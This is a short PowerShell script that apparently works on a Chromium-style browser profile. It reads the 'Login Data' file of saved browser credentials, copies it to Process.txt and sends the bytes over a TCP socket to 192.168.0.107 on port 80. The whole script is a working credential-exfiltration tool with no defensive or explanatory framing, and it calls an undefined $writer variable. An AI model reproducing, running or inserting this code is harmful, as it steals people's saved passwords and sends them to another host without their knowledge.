cd Default

$var = cat "Login Data"

cd Network

Write-Output $var | Out-File -FilePath ./Process.txt

Start-Sleep -Seconds 3

$test=[io.file]::ReadAllBytes("./Process.txt");
$socket = New-Object net.sockets.tcpclient('192.168.0.107',80);
$stream = $socket.GetStream();
$stream.write($test,0,$test.Length);
$writer.flush();
$socket.close()

Start-Sleep -Seconds 3





